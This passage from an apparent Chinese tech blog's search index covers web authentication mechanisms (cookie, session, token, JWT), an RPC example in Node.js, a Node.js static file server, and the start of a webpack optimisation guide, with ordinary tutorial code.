是否仅被使用安全协议传输。安全协议有 HTTPS，SSL等，在网络上传输数据之前先将数据加密。默认为false。当 secure 值为 true 时，cookie 在 HTTP 中是无效，在 HTTPS 中才有效。                                                  |\n|  httpOnly  | 如果给某个 cookie 设置了 httpOnly 属性，则无法通过 JS 脚本 读取到该 cookie 的信息，但还是能通过 Application 中手动修改 cookie，所以只是在一定程度上可以防止 XSS 攻击，不是绝对的安全                                              |\n\n## Session\nsession 是另一种记录服务器和客户端会话状态的机制。\nsession 是基于 cookie 实现的，session 存储在服务器端，sessionId 会被存储到客户端的cookie 中。\n### 认证流程\n![Session流程图](1.png)\n\n- 用户第一次请求服务器的时候，服务器根据用户提交的相关信息，创建对应的 Session\n- 请求返回时将此 Session 的唯一标识信息 SessionID 返回给浏览器\n- 浏览器接收到服务器返回的 SessionID 信息后，会将此信息存入到 Cookie 中，同时 Cookie 记录此 SessionID 属于哪个域名\n- 当用户第二次访问服务器的时候，请求会自动判断此域名下是否存在 Cookie 信息，如果存在自动将 Cookie 信息也发送给服务端，服务端会从 Cookie 中获取 SessionID，再根据 SessionID 查找对应的 Session 信息，如果没有找到说明用户没有登录或者登录失效，如果找到 Session 证明用户已经登录可执行后面操作。\n根据以上流程可知，SessionID 是连接 Cookie 和 Session 的一道桥梁，大部分系统也是根据此原理来验证用户登录状态。\n\n## Token\n访问资源接口（API）时所需要的资源凭证；\n\n简单 token 的组成： uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign（签名，token 的前几位以哈希算法压缩成的一定长度的十六进制字符串）\n\n### 特点\n服务端无状态化、可扩展性好；支持移动端设备；安全；支持跨程序调用\n### Token认证流程\n![Token流程图](2.png)\n\n- 客户端使用用户名跟密码请求登录\n- 服务端收到请求，去验证用户名与密码\n- 验证成功后，服务端会签发一个 token 并把这个 token 发送给客户端\n- 客户端收到 token 以后，会把它存储起来，比如放在 cookie 里或者 localStorage 里\n- 客户端每次向服务端请求资源的时候需要带着服务端签发的 token\n- 服务端收到请求，然后去验证客户端请求里面带着的 token ，如果验证成功，就向客户端返回请求的数据\n\n每一次请求都需要携带 token，需要把 token 放到 HTTP 的 Header 里\n\n基于 token 的用户认证是一种服务端无状态的认证方式，服务端不用存放 token 数据。用解析 token 的计算时间换取 session 的存储空间，从而减轻服务器的压力，减少频繁的查询数据库\n\ntoken 完全由应用管理，所以它可以避开同源策略\n\n## JWT\nJSON Web Token（简称 JWT）是目前最流行的跨域认证解决方案。\n\n是一种认证授权机制。\n\nJWT 是为了在网络应用环境间传递声明而执行的一种基于 JSON 的开放标准（RFC 7519）。JWT 的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源。比如用在用户登录上。\n\n可以使用 HMAC 算法或者是 RSA 的公/私秘钥对 JWT 进行签名。因为数字签名的存在，这些传递的信息是可信的。\n### 生成JWT\njwt.io/\n\nwww.jsonwebtoken.io/\n\n### JWT认证流程\n![JWT流程图](3.png)\n\n- 用户输入用户名/密码登录，服务端认证成功后，会返回给客户端一个 JWT\n- 客户端将 token 保存到本地（通常使用 localstorage，也可以使用 cookie）\n- 当用户希望访问一个受保护的路由或者资源的时候，需要请求头的 Authorization 字段中使用Bearer 模式添加 JWT，其内容看起来是下面这样\n```\nAuthorization: Bearer <token>\n```\n- 服务端的保护路由将会检查请求头 Authorization 中的 JWT 信息，如果合法，则允许用户的行为\n- 因为 JWT 是自包含的（内部包含了一些会话信息），因此减少了需要查询数据库的需要\n- 因为 JWT 并不使用 Cookie 的，所以你可以使用任何域名提供你的 API 服务而不需要担心跨域资源共享问题（CORS）\n- 因为用户的状态不再存储在服务端的内存中，所以这是一种无状态的认证机制\n\n另外，也可以通过URL或者POST请求的数据体传输JWT。\n\n## 区别\n\n### Cookie与Session\n\n- 安全性： Session 比 Cookie 安全，Session 是存储在服务器端的，Cookie 是存储在客户端的。\n- 存取值的类型不同：Cookie 只支持存字符串数据，想要设置其他类型的数据，需要将其转换成字符串，Session 可以存任意数据类型。\n- 有效期不同： Cookie 可设置为长时间保持，比如我们经常使用的默认登录功能，Session 一般失效时间较短，客户端关闭（默认情况下）或者 Session 超时都会失效。\n- 存储大小不同： 单个 Cookie 保存的数据不能超过 4K，Session 可存储数据远高于 Cookie，但是当访问量过多，会占用过多的服务器资源。\n\n### Session与Token\n\n- Session 是一种记录服务器和客户端会话状态的机制，使服务端有状态化，可以记录会话信息。而 Token 是令牌，访问资源接口（API）时所需要的资源凭证。Token 使服务端无状态化，不会存储会话信息。\n- Session 和 Token 并不矛盾，作为身份认证 Token 安全性比 Session 好，因为每一个请求都有签名还能防止监听以及重放攻击，而 Session 就必须依赖链路层来保障通讯安全了。如果你需要实现有状态的会话，仍然可以增加 Session 来在服务器端保存一些状态。\n- 所谓 Session 认证只是简单的把 User 信息存储到 Session 里，因为 SessionID 的不可预测性，暂且认为是安全的。而 Token ，如果指的是 OAuth Token 或类似的机制的话，提供的是 认证 和 授权 ，认证是针对用户，授权是针对 App 。其目的是让某 App 有权利访问某用户的信息。这里的 Token 是唯一的。不可以转移到其它 App上，也不可以转到其它用户上。Session 只提供一种简单的认证，即只要有此 SessionID ，即认为有此 User 的全部权利。是需要严格保密的，这个数据应该只保存在站方，不应该共享给其它网站或者第三方 App。所以简单来说：如果你的用户数据可能需要和第三方共享，或者允许第三方调用 API 接口，用 Token 。如果永远只是自己的网站，自己的 App，用什么就无所谓了。\n\n### Token与JWT\n\n相同：\n- 都是访问资源的令牌\n- 都可以记录用户的信息\n- 都是使服务端无状态化\n- 都是只有验证成功后，客户端才能访问服务端上受保护的资源\n\n区别：\n- Token：服务端验证客户端发送过来的 Token 时，还需要查询数据库获取用户信息，然后验证 Token 是否有效。\n- JWT： 将 Token 和 Payload 加密后存储于客户端，服务端只需要使用密钥解密进行校验（校验也是 JWT 自己实现的）即可，不需要查询或者减少查询数据库，因为 JWT 自包含了用户信息和加密的数据。\n\n# 参考\nhttps://juejin.im/post/5e055d9ef265da33997a42cc","tags":["基础"],"categories":["其他"]},{"title":"深入浅出TCP/IP协议栈","url":"%2FTCP-IP%2F","content":"\n# 概述\n网上看到一篇介绍TCP/IP协议族的文章，浅显易懂，收录下：[深入浅出TCP/IP协议栈](https://www.cnblogs.com/onepixel/p/7092302.html)。\n<!-- more -->\n\n# 详述\n\n# 参考\n","tags":["基础"],"categories":["其他"]},{"title":"理解RPC及原理实现","url":"%2Fmeet-RPC%2F","content":"\n# 概述\n缘起学习Node.js过程中实现BFF层时涉及到RPC概念，于是花了两三天时间好好整理了下相关知识点。从概念到原理再到Node.js的实现示例。重点在于理解RPC的技术思想，因为具体实践中都是用成熟的RPC框架。\n<!-- more -->\n\n# 详述\n\n## 概念\nRPC(Remote Procedure Call)：远程过程调用，它是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的思想。RPC 是一种技术思想而非一种规范或协议，熟悉Ajax和Redux的同学，学完RPC可能会找到一种“熟悉的陌生人”的感觉。\n\n## 原理\n\n### 完整框架\n在一个典型 RPC 的使用场景中，包含了服务发现、负载、容错、网络传输、序列化等组件，其中“RPC协议”部分是实现一个RPC架构的核心，指明了程序如何进行网络传输和序列化。\n![完整的RPC框架](01.jpg)\n\n### 核心功能\n一个 RPC 的核心功能主要有 5 个部分组成，分别是：客户端、客户端 Stub、网络传输模块、服务端 Stub、服务端。\n![RPC核心功能](02.png)\n\n一次 RPC 调用流程如下：\n\n-  服务消费者(Client 客户端)通过本地调用的方式调用服务。\n-  客户端存根(Client Stub)接收到调用请求后负责将方法、入参等信息序列化(组装)成能够进行网络传输的消息体。\n-  客户端存根(Client Stub)找到远程的服务地址，并且将消息通过网络发送给服务端。\n-  服务端存根(Server Stub)收到消息后进行解码(反序列化操作)。\n-  服务端存根(Server Stub)根据解码结果调用本地的服务进行相关处理\n-  服务端(Server)本地服务业务处理。\n-  处理结果返回给服务端存根(Server Stub)。\n-  服务端存根(Server Stub)序列化结果。\n-  服务端存根(Server Stub)将结果通过网络发送至消费方。\n-  客户端存根(Client Stub)接收到消息，并进行解码(反序列化)。\n-  服务消费方得到最终结果。\n\nRPC 的核心功能主要由 5 个模块组成，如果想要自己实现一个 RPC，最简单的方式要实现三个技术点，分别是：服务寻址、数据流的序列化和反序列化和网络传输。\n\n#### 服务寻址\n服务寻址可以使用 Call ID 映射。在本地调用中，函数体是直接通过函数指针来指定的，但是在远程调用中，函数指针是不行的，因为两个进程的地址空间是完全不一样的。\n所以在 RPC 中，所有的函数都必须有自己的一个 ID。这个 ID 在所有进程中都是唯一确定的。\n客户端在做远程过程调用时，必须附上这个 ID。然后我们还需要在客户端和服务端分别维护一个函数和Call ID的对应表。\n当客户端需要进行远程调用时，它就查一下这个表，找出相应的 Call ID，然后把它传给服务端，服务端也通过查表，来确定客户端需要调用的函数，然后执行相应函数的代码。\n\n实现方式：服务注册中心。\n\n要调用服务，首先你需要一个服务注册中心去查询对方服务都有哪些实例。Dubbo 的服务注册中心是可以配置的，官方推荐使用 Zookeeper。\n\n#### 序列化和反序列化\n客户端怎么把参数值传给远程的函数呢?在本地调用中，我们只需要把参数压到栈里，然后让函数自己去栈里读就行。\n但是在远程过程调用时，客户端跟服务端是不同的进程，不能通过内存来传递参数。\n这时候就需要客户端把参数先转成一个字节流，传给服务端后，再把字节流转成自己能读取的格式。\n只有二进制数据才能在网络中传输，序列化和反序列化的定义是：\n-  将对象转换成二进制流的过程叫做序列化\n-  将二进制流转换成对象的过程叫做反序列化\n\n这个过程叫序列化和反序列化。同理，从服务端返回的值也需要序列化反序列化的过程。\n#### 网络传输\n客户端和服务端是通过网络连接的，所有的数据都需要通过网络传输，因此就需要有一个网络传输层。网络传输层需要把 Call ID 和序列化后的参数字节流传给服务端，然后再把序列化后的调用结果传回客户端。\n只要能完成这两者的，都可以作为传输层使用。因此，它所使用的协议其实是不限的，能完成传输就行。\n尽管大部分 RPC 框架都使用 TCP 协议，但其实 UDP 也可以，而 gRPC 干脆就用了 HTTP2。\nTCP 的连接是最常见的，简要分析基于 TCP 的连接：通常 TCP 连接可以是按需连接(需要调用的时候就先建立连接，调用结束后就立马断掉)，也可以是长连接(客户端和服务器建立起连接之后保持长期持有，不管此时有无数据包的发送，可以配合心跳检测机制定期检测建立的连接是否存活有效)，多个远程过程调用共享同一个连接。\n所以，要实现一个 RPC 框架，只需要把以下三点实现了就基本完成了：\n\n-  Call ID 映射：可以直接使用函数字符串，也可以使用整数 ID。映射表一般就是一个哈希表。\n-  序列化反序列化：可以自己写，也可以使用 Protobuf 或者 FlatBuffers 之类的。\n-  网络传输库：可以自己写 Socket，或者用 Asio，ZeroMQ，Netty 之类。\n\n至于TCP、UDP、HTTP之间的区别，简单说来就是相对于HTTP，TCP和UDP更底层，传输的是二进制流，因此体积更小更快，当然缺点就是实现更复杂。反过来说就是，HTTP实现简单，可以利用成熟的web服务器收发请求，有完善的工具处理JSON、XML数据格式，但是相对来说体积大速度慢。至于TCP与UDP的区别，简言之就是TCP可靠、稳定，UDP更快但是可能会丢包。\n因此，大部分RPC框架会选择TCP协议作为传输层实现。\n\n## 实现示例（Node.js、TCP）\n\n服务端实现示例：\n```js\n// server.js---------------------------------\nconst net = require('net');\n\n// 假数据\nconst LESSON_DATA = {\n  136797: '01 | 课程介绍',\n  136798: '02 | 内容综述',\n  136799: '03 | Node.js是什么？',\n  136800: '04 | Node.js可以用来做什么？',\n  136801: '05 | 课程实战项目介绍',\n  136803: '06 | 什么是技术预研？',\n  136804: '07 | Node.js开发环境安装',\n  136806: '08 | 第一个Node.js程序：石头剪刀布游戏',\n  136807: '09 | 模块：CommonJS规范',\n  136808: '10 | 模块：使用模块规范改造石头剪刀布游戏',\n  136809: '11 | 模块：npm',\n  141994: '12 | 模块：Node.js内置模块',\n  143517: '13 | 异步：非阻塞I/O',\n  143557: '14 | 异步：异步编程之callback',\n  143564: '15 | 异步：事件循环',\n  143644: '16 | 异步：异步编程之Promise',\n  146470: '17 | 异步：异步编程之async/await',\n  146569: '18 | HTTP：什么是HTTP服务器？',\n  146582: '19 | HTTP：简单实现一个HTTP服务器'\n};\n\nconst server = net.createServer(socket => {\n  let oldBuffer = null;\n  socket.on('data', buffer => {\n    // 把上一次data事件使用残余的buffer接上来\n    if (oldBuffer) {\n      buffer = Buffer.concat([oldBuffer, buffer]);\n    }\n    let packageLength = 0;\n    // 只要还存在可以解成完整包的包长\n    while ((packageLength = checkComplete(buffer))) {\n      const package = buffer.slice(0, packageLength);\n      buffer = buffer.slice(packageLength);\n\n      // 把这个包解成数据和seq\n      const result = decode(package);\n\n      // 计算得到要返回的结果，并write返回\n      socket.write(encode(LESSON_DATA[result.data], result.seq));\n    }\n    // 把残余的buffer记下来\n    oldBuffer = buffer;\n  });\n});\n\nserver.listen(4000);\n\n/**\n * 二进制包编码函数\n * 在一段rpc调用里，服务端需要经常编码rpc调用时，业务数据的返回包\n */\nfunction encode(data, seq) {\n  // 正常情况下，这里应该是使用 protobuf 来encode一段代表业务数据的数据包\n  // 为了不要混淆重点，这个例子比较简单，就直接把课程标题转buffer返回\n  const body = Buffer.from(data);\n\n  // 一般来说，一个rpc调用的数据包会分为定长的包头和不定长的包体两部分\n  // 包头的作用就是用来记载包的序号和包的长度，以实现全双工通信\n  const header = Buffer.alloc(6);\n  header.writeInt16BE(seq);\n  header.writeInt32BE(body.length, 2);\n\n  const buffer = Buffer.concat([header, body]);\n\n  return buffer;\n}\n\n/**\n * 二进制包解码函数\n * 在一段rpc调用里，服务端需要经常解码rpc调用时，业务数据的请求包\n */\nfunction decode(buffer) {\n  const header = buffer.slice(0, 6);\n  const seq = header.readInt16BE();\n\n  // 正常情况下，这里应该是使用 protobuf 来decode一段代表业务数据的数据包\n  // 为了不要混淆重点，这个例子比较简单，就直接读一个Int32即可\n  const body = buffer.slice(6).readInt32BE();\n\n  // 这里把seq和数据返回出去\n  return {\n    seq,\n    data: body\n  };\n}\n\n/**\n * 检查一段buffer是不是一个完整的数据包。\n * 具体逻辑是：判断header的bodyLength字段，看看这段buffer是不是长于header和body的总长\n * 如果是，则返回这个包长，意味着这个请求包是完整的。\n * 如果不是，则返回0，意味着包还没接收完\n * @param {} buffer\n */\nfunction checkComplete(buffer) {\n  if (buffer.length < 6) {\n    return 0;\n  }\n  const bodyLength = buffer.readInt32BE(2);\n  return 6 + bodyLength;\n}\n```\n客户端实现示例：\n```js\n// client.js-------------------\n\nconst net = require('net');\n\nconst LESSON_IDS = [\n  \"136797\",\n  \"136798\",\n  \"136799\",\n  \"136800\",\n  \"136801\",\n  \"136803\",\n  \"136804\",\n  \"136806\",\n  \"136807\",\n  \"136808\",\n  \"136809\",\n  \"141994\",\n  \"143517\",\n  \"143557\",\n  \"143564\",\n  \"143644\",\n  \"146470\",\n  \"146569\",\n  \"146582\"\n]\n\nconst socket = new net.Socket({});\n\nsocket.connect({\n    host: '127.0.0.1',\n    port: 4000\n});\n\nlet id = Math.floor(Math.random() * LESSON_IDS.length);\n\nlet oldBuffer = null;\nsocket.on('data', (buffer) => {\n    // 把上一次data事件使用残余的buffer接上来\n    if (oldBuffer) {\n        buffer = Buffer.concat([oldBuffer, buffer]);\n    }\n    let completeLength = 0;\n\n    // 只要还存在可以解成完整包的包长\n    while (completeLength = checkComplete(buffer)) {\n        const package = buffer.slice(0, completeLength);\n        buffer = buffer.slice(completeLength);\n\n        // 把这个包解成数据和seq\n        const result = decode(package);\n        console.log(`包${result.seq}，返回值是${result.data}`);\n    }\n\n    // 把残余的buffer记下来\n    oldBuffer = buffer;\n})\n\n\nlet seq = 0;\n/**\n * 二进制包编码函数\n * 在一段rpc调用里，客户端需要经常编码rpc调用时，业务数据的请求包\n */\nfunction encode(data) {\n    // 正常情况下，这里应该是使用 protobuf 来encode一段代表业务数据的数据包\n    // 为了不要混淆重点，这个例子比较简单，就直接把课程id转buffer发送\n    const body = Buffer.alloc(4);\n    body.writeInt32BE(LESSON_IDS[data.id]);\n\n    // 一般来说，一个rpc调用的数据包会分为定长的包头和不定长的包体两部分\n    // 包头的作用就是用来记载包的序号和包的长度，以实现全双工通信\n    const header = Buffer.alloc(6);\n    header.writeInt16BE(seq)\n    header.writeInt32BE(body.length, 2);\n\n    // 包头和包体拼起来发送\n    const buffer = Buffer.concat([header, body])\n\n    console.log(`包${seq}传输的课程id为${LESSON_IDS[data.id]}`);\n    seq++;\n    return buffer;\n}\n\n/**\n * 二进制包解码函数\n * 在一段rpc调用里，客户端需要经常解码rpc调用时，业务数据的返回包\n */\nfunction decode(buffer) {\n    const header = buffer.slice(0, 6);\n    const seq = header.readInt16BE();\n\n    const body = buffer.slice(6)\n\n    return {\n        seq,\n        data: body.toString()\n    }\n}\n\n/**\n * 检查一段buffer是不是一个完整的数据包。\n * 具体逻辑是：判断header的bodyLength字段，看看这段buffer是不是长于header和body的总长\n * 如果是，则返回这个包长，意味着这个请求包是完整的。\n * 如果不是，则返回0，意味着包还没接收完\n * @param {} buffer \n */\nfunction checkComplete(buffer) {\n    if (buffer.length < 6) {\n        return 0;\n    }\n    const bodyLength = buffer.readInt32BE(2);\n    return 6 + bodyLength\n}\n\nfor (let k = 0; k < 100; k++) {\n    id = Math.floor(Math.random() * LESSON_IDS.length);\n    socket.write(encode({ id }));\n}\n```\n\n# 参考\nhttp://developer.51cto.com/art/201906/597963.htm\n\nhttps://www.yuque.com/egg/nodejs/dklip5\n\nhttps://time.geekbang.org/course/detail/232-152724","tags":["Node.js"],"categories":["其他"]},{"title":"nodejs实现静态服务器","url":"%2Fnodejs-static-server%2F","content":"\n# 概述\n\n本文通过用 Node.js 实现一个 web 静态服务器来深入学习 node 和 http 相关知识。第一部分实现一个最基本的 web 静态服务器，第二部分实现一个含有缓存、压缩、命令行等功能的一个 web 静态服务器。\n\n<!-- more -->\n\n# 详述\n\n## 基础实现\n\n```js\nconst http = require('http');\nconst path = require('path');\nconst fs = require('fs');\nconst url = require('url');\nconst mime = require('mime');\n\nhttp\n  .createServer(function(req, res) {\n    const publicPath = path.join(__dirname, 'public');\n\n    // 第一个坑，如果引用的文件是带版本号的，不处理是读取不到这个文件的\n    // H:\\workspace\\nodejs\\static-server\\basic\\public\\fonts\\fontawesome-webfont.woff?v=4.2.0\n    // 方法一：\n    // let filename = path.join(publicPath, req.url);\n    // if (filename.indexOf('?') != -1) {\n    //   filename = filename.substring(0, filename.indexOf('?'))\n    // }\n    // 方法二：\n    const { pathname } = url.parse(req.url);\n    const filename = path.join(publicPath, pathname);\n\n    fs.readFile(filename, function(err, data) {\n      if (err) {\n        res.setHeader('Content-type', 'text/html;charset=utf8');\n        res.end('文件不存在 404');\n        return;\n      }\n      res.setHeader('Content-Type', mime.getType(filename));\n      res.end(data);\n    });\n  })\n  .listen('3000', function() {\n    console.log('server started in http://localhost:3000');\n  });\n```\n\n使用 http 模块实例一个 server 对象，用 path 模块处理路径，用 fs 模块进行文件的 I/O 操作，用 url 模块对 URL 处理，用 mime 模块处理文件类型。\n\n实现的时候遇到一个坑，测试时字体图标一直不显示：\n![字体图标不显示](01.jpg)\n最后才发现原来是样式文件中定义`@font-face`时引用的字体带了查询信息，直接用`req.url`拼接的文件路径也是带版本号等查询信息的，而 fs 模块读取文件是完全匹配，因此读取不到该字体文件。处理的思路就是去掉查询信息，代码中给出了两种实现方法。\n\n## 进阶实现\n\n这个网上有篇[深入 nodejs-搭建静态服务器（实现命令行）](https://segmentfault.com/a/1190000018101338)讲的很详细，这里只摘录其中主体代码，然后着重说下其中涉及到的知识点，但是原文没有说明的部分。\n\n```js\n// app.js\nconst http = require('http');\nconst url = require('url');\nconst path = require('path');\nconst fs = require('fs');\nconst mime = require('mime'); // 文件类型\nconst crypto = require('crypto'); // 加密\nconst zlib = require('zlib'); // 压缩\nconst openbrowser = require('open'); // 自动启动浏览器\nconst handlebars = require('handlebars'); // 模板引擎\nconst templates = require('./templates'); // 模板文件目录\n\nclass StaticServer {\n  constructor(options) {\n    this.host = options.host;\n    this.port = options.port;\n    this.rootPath = process.cwd();\n    this.cors = options.cors;\n    this.openbrowser = options.openbrowser;\n  }\n\n  /**\n   * handler request\n   * @param {*} req\n   * @param {*} res\n   */\n  requestHandler(req, res) {\n    const { pathname } = url.parse(req.url);\n    const filepath = path.join(this.rootPath, pathname);\n\n    // To check if a file exists\n    fs.stat(filepath, (err, stat) => {\n      if (!err) {\n        if (stat.isDirectory()) {\n          this.responseDirectory(req, res, filepath, pathname);\n        } else {\n          this.responseFile(req, res, filepath, stat);\n        }\n      } else {\n        this.responseNotFound(req, res);\n      }\n    });\n  }\n\n  /**\n   * Reads the contents of a directory , response files list to client\n   * @param {*} req\n   * @param {*} res\n   * @param {*} filepath\n   */\n  responseDirectory(req, res, filepath, pathname) {\n    fs.readdir(filepath, (err, files) => {\n      if (!err) {\n        const fileList = files.map(file => {\n          const isDirectory = fs.statSync(filepath + '/' + file).isDirectory();\n          return {\n            filename: file,\n            url: path.join(pathname, file),\n            isDirectory\n          };\n        });\n        const html = handlebars.compile(templates.fileList)({\n          title: pathname,\n          fileList\n        });\n        res.setHeader('Content-Type', 'text/html');\n        res.end(html);\n      }\n    });\n  }\n\n  /**\n   * response resource\n   * @param {*} req\n   * @param {*} res\n   * @param {*} filepath\n   */\n  async responseFile(req, res, filepath, stat) {\n    this.cacheHandler(req, res, filepath).then(\n      data => {\n        if (data === true) {\n          res.writeHead(304);\n          res.end();\n        } else {\n          res.setHeader(\n            'Content-Type',\n            mime.getType(filepath) + ';charset=utf-8'\n          );\n          res.setHeader('Etag', data);\n\n          this.cors && res.setHeader('Access-Control-Allow-Origin', '*');\n\n          const compress = this.compressHandler(req, res);\n\n          if (compress) {\n            fs.createReadStream(filepath)\n              .pipe(compress)\n              .pipe(res);\n          } else {\n            fs.createReadStream(filepath).pipe(res);\n          }\n        }\n      },\n      error => {\n        this.responseError(req, res, error);\n      }\n    );\n  }\n\n  /**\n   * not found request file\n   * @param {*} req\n   * @param {*} res\n   */\n  responseNotFound(req, res) {\n    const html = handlebars.compile(templates.notFound)();\n    res.writeHead(404, {\n      'Content-Type': 'text/html'\n    });\n    res.end(html);\n  }\n\n  /**\n   * server error\n   * @param {*} req\n   * @param {*} res\n   * @param {*} err\n   */\n  responseError(req, res, err) {\n    res.writeHead(500);\n    res.end(`there is something wrong in th server! please try later!`);\n  }\n\n  /**\n   * To check if a file have cache\n   * @param {*} req\n   * @param {*} res\n   * @param {*} filepath\n   */\n  cacheHandler(req, res, filepath) {\n    return new Promise((resolve, reject) => {\n      const readStream = fs.createReadStream(filepath);\n      const md5 = crypto.createHash('md5');\n      const ifNoneMatch = req.headers['if-none-match'];\n      readStream.on('data', data => {\n        md5.update(data);\n      });\n\n      readStream.on('end', () => {\n        let etag = md5.digest('hex');\n        if (ifNoneMatch === etag) {\n          resolve(true);\n        }\n        resolve(etag);\n      });\n\n      readStream.on('error', err => {\n        reject(err);\n      });\n    });\n  }\n\n  /**\n   * compress file\n   * @param {*} req\n   * @param {*} res\n   */\n  compressHandler(req, res) {\n    const acceptEncoding = req.headers['accept-encoding'];\n    if (/\\bgzip\\b/.test(acceptEncoding)) {\n      res.setHeader('Content-Encoding', 'gzip');\n      return zlib.createGzip();\n    } else if (/\\bdeflate\\b/.test(acceptEncoding)) {\n      res.setHeader('Content-Encoding', 'deflate');\n      return zlib.createDeflate();\n    } else {\n      return false;\n    }\n  }\n\n  /**\n   * server start\n   */\n  start() {\n    const server = http.createServer((req, res) =>\n      this.requestHandler(req, res)\n    );\n    server.listen(this.port, () => {\n      if (this.openbrowser) {\n        openbrowser(`http://${this.host}:${this.port}`);\n      }\n      console.log(`server started in http://${this.host}:${this.port}`);\n    });\n  }\n}\n\nmodule.exports = StaticServer;\n```\n\n像`url.parse()`、`fs.stat()`等都是标准的 node 内置模块 API，直接查官方文档就好。其他延展知识点有：\n\n### `process.cwd()`与`__dirname` 区别\n\nprocess.cwd()返回的是当前 Node.js 进程执行时的工作目录，保证了文件在不同的目录下执行时，路径始终不变。\n\\_\\_dirname 是当前模块的目录名，是当前被执行的 js 所在的目录。\n\n### Node 实现四种缓存\n\n```js\nconst http = require('http');\n\n// Expires\nlet server = http.createServer((req, res) => {\n  res.setHeader('Expires', new Date().toGMTString());\n  res.end('harttle.land');\n});\n\n// Cache-Control\nlet server = http.createServer((req, res) => {\n  res.setHeader('Cache-Control', 'public, max-age=86400');\n  res.end('harttle.land');\n});\n\n// Etag\nlet server = http.createServer((req, res) => {\n  console.log(req.url, req.headers['if-none-match']);\n  if (req.headers['if-none-match']) {\n    res.statusCode = 304;\n    res.end();\n  } else {\n    res.setHeader('Etag', '12345678');\n    res.end('harttle.land');\n  }\n});\n\n// Last-Modified\nlet server = http.createServer((req, res) => {\n  console.log(req.url, req.headers['if-modified-since']);\n  if (req.headers['if-modified-since']) {\n    res.statusCode = 304;\n    res.end();\n  } else {\n    res.setHeader('Last-Modified', new Date().toISOString());\n    res.end('harttle.land');\n  }\n});\n\nconsole.log('server start at http://localhost:3333');\nserver.listen(3333);\n```\n\n[更多介绍](https://www.jianshu.com/p/227cee9c8d15)\n\n### `/\\bgzip\\b/`中的`\\b`是什么\n\n`\\b`表示字母数字与非字母数字的边界，非字母数字与字母数字的边界。其实就是一个位置匹配，就像开头`^`，结尾`$`。\n\n### 自动启动默认浏览器\n\n这里用了第三方模块`open`，当然可以自己封装个：\n\n```js\n//打开默认浏览器\nconst openDefaultBrowser = function(url) {\n  var exec = require('child_process').exec;\n  console.log(process.platform);\n  switch (process.platform) {\n    case 'darwin':\n      exec('open ' + url);\n      break;\n    case 'win32':\n      exec('start ' + url);\n      break;\n    default:\n      exec('xdg-open', [url]);\n  }\n};\nopenDefaultBrowser('http://localhost:3000');\n```\n\n### `#!/usr/bin/env node`干嘛用的\n\n指定用 node 来执行脚本文件。[更多介绍](https://juejin.im/post/5cb93cd651882578b148c637)\n\n# 参考\n\nhttps://edu.aliyun.com/lesson_1730_14108?spm=5176.10731542.0.0.7fe04a3e9HronY#_14108\n\nhttps://segmentfault.com/a/1190000018101338\n\nhttps://www.jianshu.com/p/aecab1749734\n\nhttps://blog.csdn.net/qq1036548849/article/details/86470140\n","tags":["Node.js"],"categories":["其他"]},{"title":"webpack构建速度与体积优化策略","url":"%2Fwebpack-optimizing%2F","content":"\n# 概述\n先介绍几种速度与体积分析方法的使用，紧接着介绍各种优化方法的使用：多进程构建解析、并行压缩、使用DLLPlugin分包、使用缓存、缩小构建目标、减少文件搜索范围、CSS的Tree Shaking、图片压缩、动态Polyfill。\n<!-- more -->\n\n# 详述\n\n## 初级分析\n\n内置的 stats，默认每次构建控制台都会显示各种统计信息，当然也可以把统计信息导出到单独文件：\n\n```json\n// package.json\n{\n  \"scripts\": {\n    \"build:stats\": \"webpack --config webpack.prod.js --json > stats.json\"\n  }\n}\n```\n\n## 速度分析\n\n使用`speed-measure-webpack-plugin`，分析整个打包总耗时，每个插件和 loader 的耗时情况。使用示例如下：\n\n```js\n// webpack.config.js\nconst SpeedMeasureWebpackPlugin = require('speed-measure-webpack-plugin');\n\nconst smp = new SpeedMeasureWebpackPlugin();\n\nmodule.exports = smp.wrap({\n  entry: '',\n  output: '',\n  ...\n})\n```\n\n## 体积分析\n\n使用`webpack-bundle-analyzer`，构建完成自动打开 8888 端口页面，可视化分析各个部分大小。使用示例如下：\n\n```js\n// webpack.config.js\nconst BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin;\n\nmodule.exports = {\n  entry: '',\n  output: '',\n  plugins: [\n    new BundleAnalyzerPlugin()\n  ]\n  ...\n}\n```\n\n详细见[官网](https://github.com/webpack-contrib/webpack-bundle-analyzer)\n\n## 使用高版本的 webpack 和 Node.js\n\n毋庸赘述，工具本身每次版本升级，基本都会有相应的性能提升。\n\n## 多进程/多实例：构建解析\n\n资源并行解析可选方案，webpack4.x 推荐用`thread-loader`，之前版本可以用`happypack`插件。`thread-loader`使用示例如下：\n\n```js\n// webpack.config.js\nmodule.exports = {\n  ...\n  module: {\n    rules: [\n      {\n        test: /\\.(js|jsx)$/,\n        use: [\n          {\n            loader: 'thread-loader',\n            options: {\n              workers: 3  //开启进程数量\n            }\n          },\n          'babel-loader'\n        ]\n      }\n    ]\n  }\n  ...\n}\n```\n\n## 多进程/多实例：并行压缩\n\nwebpack4.x 推荐用`terser-webpack-plugin`，其他版本可选方案`parallel-uglify-plugin`、`uglifyjs-webpack-plugin`。`terser-webpack-plugin`使用示例如下：\n\n```js\n// webpack.config.js\nmodule.exports = {\n  ...\n  optimization: {\n    minimizer: [\n        new TerserWebpackPlugin({\n            parallel: true\n        })\n    ]\n  },\n  ...\n}\n```\n\n## 分包\n\n前面的文章中介绍过可以用`html-webpack-externalsplugin`来分离基础包，或者用`splitChunks`来提取公共包。除此之外，更好的分包方式是用`DLLPlugin`，这个方式是预编译资源模块，因此构建速度更快。使用示例如下：\n\n### 新增`webpack.dll.js`\n\n```js\n// webpack.dll.js\nconst path = require('path');\nconst webpack = require('webpack');\n\nmodule.exports = {\n  mode: 'none',\n  entry: {\n    library: ['react', 'react-dom', 'redux', 'react-redux']\n  },\n  output: {\n    filename: '[name].dll.js',\n    path: path.join(__dirname, 'build/library'),\n    library: '[name]'\n  },\n  plugins: [\n    new webpack.DllPlugin({\n      name: '[name]',\n      path: path.join(__dirname, 'build/library/[name].json')\n    })\n  ]\n};\n```\n\n### 新增一条`scripts`\n\n```json\n{\n  \"scripts\": {\n    \"dll\": \"webpack --config webpack.dll.js\"\n  }\n}\n```\n\n### 配置映射\n\n```js\n// webpack.config.js\n\nconst webpack = require('webpack')\n\nmodule.exports = {\n  ...\n  plugins: [\n    new webpack.DllReferencePlugin({\n      manifest: require('./build/library/library.json')\n    })\n  